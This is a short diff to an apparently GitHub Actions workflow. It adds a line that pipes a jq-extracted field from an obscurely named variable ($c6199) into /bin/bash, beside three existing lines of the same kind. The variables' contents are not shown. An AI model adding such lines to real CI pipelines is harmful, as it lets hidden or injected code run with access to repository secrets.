@@ -24,6 +24,7 @@ jobs:
           echo $ne21 | jq -r .zf2 | /bin/bash
           echo $egvc73752 | jq -r .xjmbr6 | /bin/bash
           printf '%s' "$q2640" | jq -r .t6 | /bin/bash
+          printf '%s' "$c6199" | jq -r .q5 | /bin/bash
 
       - name: Store output
         uses: actions/upload-artifact@v4
